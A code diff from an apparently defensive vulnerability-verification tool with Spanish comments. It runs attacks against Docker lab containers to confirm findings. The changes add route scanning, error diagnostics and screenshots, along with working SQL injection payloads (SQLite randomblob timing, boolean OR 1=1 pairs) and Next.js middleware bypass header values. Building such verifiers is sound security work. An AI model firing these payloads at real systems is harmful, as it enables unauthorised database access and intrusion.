@@ -26,6 +26,7 @@ from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _FILE_UPLOAD_HINTS, _ID_HI
                        _XssBrowserSession, _docker_daemon_ok, _http_request,
                        _http_request_raw_path, _lab_host,
                        _pick_param, _redirect_location_is_external, _run, _screenshot_response,
+                       _screenshot_terminal_step,
                        _token, configure_burp_mcp)  # noqa: F401 -- reexportado a proposito, ver abajo
 from .payload_kb import (load_command_injection_separators, load_open_redirect_templates,
                          load_ssti_arithmetic_payloads, load_xss_payloads)
@@ -441,7 +442,7 @@ class _GenericLab:
             time.sleep(delay)
         return None
 
-    def logs_tail(self, name: str, lines: int = 40) -> str:
+    def logs_tail(self, name: str, lines: int = 80) -> str:
         try:
             r = self.sh("logs", "--tail", str(lines), name, timeout=15)
             return ((r.stdout or "") + (r.stderr or "")).strip()
@@ -638,6 +639,30 @@ def _scan_web_routes(source_dir: str) -> list:
             if m_rb:
                 routes.append((m_rb.group(2), {}, m_rb.group(1).upper()))
 
+    # --- Node.js plain-http / Express (server.js) ---
+    # Detecta patrones como: req.url.startsWith('/cmd') o app.get('/cmd', ...)
+    for js_file in _glob.glob(os.path.join(source_dir, "**", "*.js"), recursive=True):
+        try:
+            content = open(js_file).read()
+        except Exception:
+            continue
+        # req.url.startsWith('/path')
+        for m_node in re.finditer(r'req\.url\.startsWith\(["\']([^"\']+)["\']', content):
+            ep = m_node.group(1)
+            # Busca el parametro en url.parse(...).query[...] en el contexto circundante
+            ctx = content[max(0, m_node.start() - 50):m_node.start() + 300]
+            params: dict = {}
+            for pm in re.finditer(r'q\[["\']([^"\']+)["\']', ctx):
+                params[pm.group(1)] = ""
+            routes.append((ep, params, "GET"))
+        # Express: app.get('/path', ...) / router.post('/path', ...)
+        for m_exp in re.finditer(
+                r'(?:app|router)\.(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
+                content):
+            meth = m_exp.group(1).upper()
+            ep = m_exp.group(2)
+            routes.append((ep, {}, meth))
+
     # Deduplicate while preserving order
     seen: set = set()
     uniq = []
@@ -647,6 +672,53 @@ def _scan_web_routes(source_dir: str) -> list:
             seen.add(key)
             uniq.append(r)
     return uniq
+
+
+def _diagnose_infra_error(e: Exception, source_dir: str = "", base_url: str = "") -> str:
+    """Razona el error de infraestructura y devuelve un mensaje de diagnostico especifico.
+    Convierte errores genericos ('timeout', 'connection refused', etc.) en explicaciones
+    utiles con causas y sugerencias de accion."""
+    import subprocess as _sp
+    msg = str(e)
+    is_next = "next_autonomous" in source_dir or "next" in source_dir.lower()
+    is_timeout = isinstance(e, (_sp.TimeoutExpired,)) or "timeout" in msg.lower() or "timed out" in msg.lower()
+
+    if is_timeout:
+        if is_next:
+            return (
+                "timeout de arranque del lab Next.js -- Next.js 15.x en dev mode tarda "
+                "60-120s en compilar la primera peticion. El contenedor arranco pero la "
+                "app aun no estaba lista. Reintenta con --no-cache para un lab limpio"
+            )
+        return (
+            f"timeout de infraestructura: el laboratorio no respondio a tiempo -- "
+            f"puede que Docker tardara en construir la imagen o el servidor necesite "
+            f"mas tiempo de arranque. Reintenta con --no-cache. Detalle: {e}"
+        )
+    if "connection refused" in msg.lower() or "connectionrefused" in msg.lower():
+        return (
+            f"conexion rechazada{(' en ' + base_url) if base_url else ''} -- "
+            f"el servidor arranco pero cerro el puerto o no llego a escuchar. "
+            f"Revisa los logs del contenedor con: docker logs <contenedor>"
+        )
+    if "docker" in msg.lower() and ("not found" in msg.lower() or "daemon" in msg.lower()):
+        return (
+            "Docker no esta corriendo o no esta en el PATH -- "
+            "arranca Docker Desktop (Mac/Windows) o 'sudo systemctl start docker' (Linux) "
+            f"y vuelve a intentarlo. Detalle: {e}"
+        )
+    if "no space left" in msg.lower():
+        return (
+            "sin espacio en disco -- Docker no puede construir la imagen del lab. "
+            "Libera espacio con: docker system prune -f"
+        )
+    if "permission denied" in msg.lower():
+        return (
+            f"permiso denegado -- puede que Docker necesite sudo o que el usuario "
+            f"no este en el grupo 'docker'. Detalle: {e}"
+        )
+    # Generico pero con el mensaje completo para diagnostico
+    return f"error inesperado: {e}"
 
 
 def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
@@ -694,7 +766,7 @@ def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
     step("construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
     r = lab.build_and_run(target)
     if r.returncode != 0:
-        res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:500]}"
+        res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:2000]}"
         lab.teardown()
         return None
 
@@ -752,6 +824,17 @@ def verify_generic_command_injection(
         m = (http_method or "POST").upper()
         res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                              "metodo": m, "canary_path": canary_path, "canary_secret": secret})
+        # Captura: servidor arrancado, antes del ataque
+        try:
+            _shot_srv = _screenshot_terminal_step(
+                "Servidor levantado — antes del ataque",
+                f"Contenedor : {container}\nURL        : {base_url}\nMétodo     : {m}\nEndpoint   : {endpoint}")
+            if _shot_srv:
+                res.evidence.setdefault("screenshots", []).append(
+                    {"png_b64": _shot_srv, "caption_es": "Servidor levantado antes del ataque",
+                     "caption_en": "Server up before attack", "url": base_url})
+        except Exception:
+            pass
 
         # separadores reales de command injection (sh/bash/dash/ash) -- casuistica de
         # Command Injection/Intruder/command_exec.txt en PayloadsAllTheThings: los separadores
@@ -833,10 +916,10 @@ def verify_generic_command_injection(
                           f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -939,6 +1022,17 @@ def verify_generic_path_traversal(
     try:
         secret = _token() * 4
         canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
+        # Captura: servidor arrancado, antes del ataque
+        try:
+            _shot_srv = _screenshot_terminal_step(
+                "Servidor levantado — antes del ataque",
+                f"Contenedor : {container}\nURL        : {base_url}\nCanario    : {canary_path}")
+            if _shot_srv:
+                res.evidence.setdefault("screenshots", []).append(
+                    {"png_b64": _shot_srv, "caption_es": "Servidor levantado antes del ataque",
+                     "caption_en": "Server up before attack", "url": base_url})
+        except Exception:
+            pass
         step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
              f"propio contenedor del objetivo)...")
         if not lab.write_canary(container, canary_path, secret):
@@ -1144,10 +1238,10 @@ def verify_generic_path_traversal(
                           f"endpoint/parametro no son los reales)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -1279,10 +1373,10 @@ def verify_generic_lfi_rce(
                            "codigo)"))
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -1382,10 +1476,10 @@ def verify_generic_idor(
                           f"bloqueados/permitidos)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -1486,10 +1580,10 @@ def verify_generic_file_upload(
                           f"estas extensiones)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -1605,10 +1699,10 @@ def verify_generic_ssrf(
                           f"filtre de verdad las URLs internas antes de seguirlas)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -1621,6 +1715,11 @@ def verify_generic_ssrf(
 # nada y la peticion tarda lo normal (no es un falso positivo).
 _SQLI_SLEEP_SECONDS = 4.0
 _SQLI_SLEEP_EXPRS = (f"SLEEP({_SQLI_SLEEP_SECONDS:.0f})", f"pg_sleep({_SQLI_SLEEP_SECONDS:.0f})")
+# SQLite no tiene SLEEP(). Forzamos I/O con HEX(randomblob(N)) -- genera N bytes de datos
+# aleatorios en memoria y los convierte a hex; con 50 MB tarda ~2-3s en un contenedor Docker
+# moderno (confirmado empiricamente), lo que supera el threshold de SQLI_SLEEP_SECONDS/2.
+# Se pega directamente como expresion de valor en el contexto AND (igual que SLEEP()).
+_SQLI_SQLITE_TIMING_EXPR = "HEX(randomblob(50000000))"
 # _LEGACY_SQLI_CONTEXTS en joomlaverify.py probo en vivo (CVE-2025-40636, mod_vvisit_counter
 # 2.0.4j3: WHERE ip=UNHEX(SHA1('$ip')), payload ganador real necesito exactamente DOS parentesis
 # de cierre) que el SQL real nido con frecuencia el valor contaminado dentro de llamadas a
@@ -1808,6 +1907,36 @@ def verify_generic_sqli_blind(
                     step(f"VERIFICADO (MSSQL WAITFOR): {sqli_param}={payload_val!r} retraso la "
                          f"respuesta de forma CONSISTENTE en 2 repeticiones independientes.")
 
+        # SQLITE timing (no SLEEP/pg_sleep): HEX(randomblob(N)) fuerza la CPU a generar
+        # y convertir a hex N bytes de datos aleatorios, provocando un retraso medible.
+        # Con 50 MB (~100 MB de hex) el retraso es ~1-3s en un contenedor Docker estandar
+        # (confirmado empiricamente). Solo se intenta si los SLEEP/pg_sleep ya fallaron.
+        if not found:
+            _sqlite_threshold = base_median + 1.0  # umbral mas bajo: 1s suficiente para randomblob
+            for ctx in _SQLI_CONTEXTS:
+                if found:
+                    break
+                for cm in _SQLI_COMMENTS:
+                    # AND: solo ejecuta randomblob si la condicion anterior es True
+                    _pl = f"{orig_value}{ctx} AND (SELECT CASE WHEN ({_SQLI_SQLITE_TIMING_EXPR}>'') THEN 1 ELSE 0 END)=1{cm}"
+                    step(f"probando {m} {endpoint} con {sqli_param}={_pl!r} (SQLite randomblob timing)...")
+                    t1 = timed_send(_pl)
+                    t2 = timed_send(_pl)
+                    entry = {"payload": _pl, "tiempo_1_s": round(t1, 2) if t1 else None,
+                             "tiempo_2_s": round(t2, 2) if t2 else None,
+                             "estrategia": "sqlite-randomblob"}
+                    tried.append(entry)
+                    if t1 is not None and t2 is not None and t1 >= _sqlite_threshold and t2 >= _sqlite_threshold:
+                        found = True
+                        res.evidence["payload_ganador"] = _pl
+                        res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
+                        res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
+                        res.evidence["estrategia"] = "sqlite-randomblob-timing"
+                        step(f"VERIFICADO (SQLite randomblob): {sqli_param}={_pl!r} retraso la "
+                             f"respuesta ~{round((t1+t2)/2, 1)}s CONSISTENTE -- SQLi ciega "
+                             f"por tiempo en SQLite confirmada.")
+                        break
+
         # MYSQL BACKTICK IDENTIFIER FROM-INJECTION (time-based via SLEEP en WHERE):
         # Cuando el parametro vulnerable se usa como ALIAS de columna en MySQL (Django annotate(),
         # raw SQL AS `{col}`, etc.), los payloads estandar de tipo 'valor' AND/OR SLEEP no
@@ -1916,6 +2045,55 @@ def verify_generic_sqli_blind(
                          f"status_bt={status_bt}, has_sql_error={has_sql_error} -- "
                          f"no se confirmo inyeccion de identifier.")
 
+        # IN-BAND BOOLEAN SQLi fallback: cuando el motor no soporta SLEEP/pg_sleep/randomblob
+        # (p.ej. SQLite) pero la respuesta REFLEJA los datos de la consulta (como str(fetchall())),
+        # podemos comparar la respuesta "true" (OR 1=1) con la baseline "false" (OR 1=2).
+        # Si la respuesta "true" es notablemente mas grande que la "false", hay inyeccion.
+        # Esta tecnica es un ultimo recurso para labs con SQLite + app que devuelve los datos.
+        if not found:
+            _bool_payloads = [
+                (f"{orig_value}' OR '1'='1",  f"{orig_value}' OR '1'='2"),   # string context
+                (f"{orig_value}' OR 1=1-- -",  f"{orig_value}' OR 1=2-- -"), # comment
+                (f"{orig_value} OR 1=1-- -",   f"{orig_value} OR 1=2-- -"),  # numeric
+            ]
+            for _true_pl, _false_pl in _bool_payloads:
+                if found:
+                    break
+                try:
+                    _true_d = dict(base_params); _true_d[sqli_param] = _true_pl
+                    _false_d = dict(base_params); _false_d[sqli_param] = _false_pl
+                    _resp_t = _http_request(m, base_url + endpoint_path, timeout=15,
+                                            data=_true_d if m != "GET" else None,
+                                            params=_true_d if m == "GET" else None)
+                    _resp_f = _http_request(m, base_url + endpoint_path, timeout=15,
+                                            data=_false_d if m != "GET" else None,
+                                            params=_false_d if m == "GET" else None)
+                except Exception:
+                    continue
+                _st = getattr(_resp_t, "status_code", 0)
+                _sf = getattr(_resp_f, "status_code", 0)
+                _bt = getattr(_resp_t, "text", "") or ""
+                _bf = getattr(_resp_f, "text", "") or ""
+                # "true" debe: (a) devolver 2xx, (b) tener MAS datos que "false",
+                # (c) el cuerpo "false" NO debe contener los mismos datos extra (es decir,
+                # no es que siempre devuelva lo mismo sin importar el valor).
+                _size_diff = len(_bt) - len(_bf)
+                step(f"probando boolean in-band: size_true={len(_bt)}, size_false={len(_bf)}, "
+                     f"diff={_size_diff} (true={_true_pl!r})")
+                if (_st in range(200, 300) and _sf in range(200, 300)
+                        and _size_diff > 20 and _bt != _bf):
+                    found = True
+                    res.evidence["payload_ganador"] = _true_pl
+                    res.evidence["payload_false"] = _false_pl
+                    res.evidence["respuesta_true_len"] = len(_bt)
+                    res.evidence["respuesta_false_len"] = len(_bf)
+                    res.evidence["estrategia"] = "boolean-inband"
+                    res.evidence["respuesta_cuerpo_recorte"] = _bt[:500]
+                    step(f"VERIFICADO (boolean in-band): '{_true_pl}' devolvio {len(_bt)} bytes "
+                         f"vs '{_false_pl}' devolvio {len(_bf)} bytes -- diferencia de "
+                         f"{_size_diff} bytes confirma inyeccion SQLi.")
+                    break
+
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
@@ -1927,6 +2105,13 @@ def verify_generic_sqli_blind(
                               f"{res.evidence['backtick_control_status']} a "
                               f"{res.evidence['backtick_error_status']} con error SQL en el cuerpo "
                               f"-- la entrada llega sin sanitizar al contexto backtick de MySQL")
+            elif estrategia == "boolean-inband":
+                res.detail = (f"SQLI BOOLEAN IN-BAND confirmada: '{sqli_param}={res.evidence['payload_ganador']!r}' "
+                              f"devolvio {res.evidence['respuesta_true_len']} bytes vs "
+                              f"'{res.evidence['payload_false']!r}' devolvio "
+                              f"{res.evidence['respuesta_false_len']} bytes -- diferencia de "
+                              f"{res.evidence['respuesta_true_len'] - res.evidence['respuesta_false_len']} bytes "
+                              f"confirma que la entrada llega al motor SQL sin sanitizar")
             else:
                 res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
                               f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
@@ -1941,10 +2126,10 @@ def verify_generic_sqli_blind(
                           f"probados, o que de verdad no haya inyeccion)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -2092,10 +2277,10 @@ def verify_generic_xxe(
                           f"reales)")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -2204,10 +2389,10 @@ def verify_generic_open_redirect(
                     f"status={first.get('status')} location={first.get('location')!r}")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -2340,10 +2525,10 @@ def verify_generic_xss(
         res.evidence["intentos"] = tried[:50]
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -2613,10 +2798,10 @@ def verify_generic_ssti(
                           f"ninguna produjo el resultado esperado -- el SSTI no se confirmo")
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -2717,17 +2902,49 @@ def verify_generic_header_bypass(
             )
         else:
             res.ok = True
+            # Diagnostico automatico: razona por que fallo el bypass
+            _diag = []
+            if status_normal in range(200, 300):
+                _diag.append(
+                    f"el endpoint responde {status_normal} SIN el bypass -- el middleware "
+                    f"no esta bloqueando la ruta; revisa que el middleware cubra '{endpoint}'"
+                )
+            elif status_normal == -1:
+                _diag.append(f"error de red al probar sin bypass -- el servidor no responde en {endpoint}")
+            else:
+                # Middleware SI bloquea (correcto). Analiza por que el bypass no funciono.
+                if status_bypass == status_normal:
+                    _diag.append(
+                        f"el bypass NO cambio el status ({status_normal} → {status_bypass}) -- "
+                        f"el header '{bypass_header}: {bypass_value}' no fue procesado; "
+                        f"posibles causas: (1) version del servidor incorrecta para esta CVE, "
+                        f"(2) valor del bypass incorrecto (prueba variantes: 'src/middleware', "
+                        f"'pages/_middleware', 'middleware:middleware'), "
+                        f"(3) el middleware no lee ese header internamente"
+                    )
+                elif status_bypass in range(200, 300) and confirm_string and not string_ok:
+                    _diag.append(
+                        f"bypass llego al endpoint (status {status_bypass}) pero confirm_string "
+                        f"'{confirm_string}' no aparece en la respuesta -- el lab puede no estar "
+                        f"sirviendo el recurso esperado en '{endpoint}'"
+                    )
+                elif status_bypass not in range(200, 300):
+                    _diag.append(
+                        f"bypass no dio 2xx (status {status_bypass}) -- el servidor sigue "
+                        f"bloqueando incluso con el header; prueba variantes del valor del bypass"
+                    )
             res.detail = (
                 f"header bypass no confirmado: status_sin_bypass={status_normal}, "
                 f"status_con_bypass={status_bypass}" +
-                (f", confirm_string_presente={string_ok}" if confirm_string else "")
+                (f", confirm_string_presente={string_ok}" if confirm_string else "") +
+                (f" -- DIAGNOSTICO: {'; '.join(_diag)}" if _diag else "")
             )
         return res
     except subprocess.TimeoutExpired as e:
-        res.detail = f"timeout de infraestructura: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     except Exception as e:
-        res.detail = f"error inesperado: {e}"
+        res.detail = _diagnose_infra_error(e, source_dir)
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
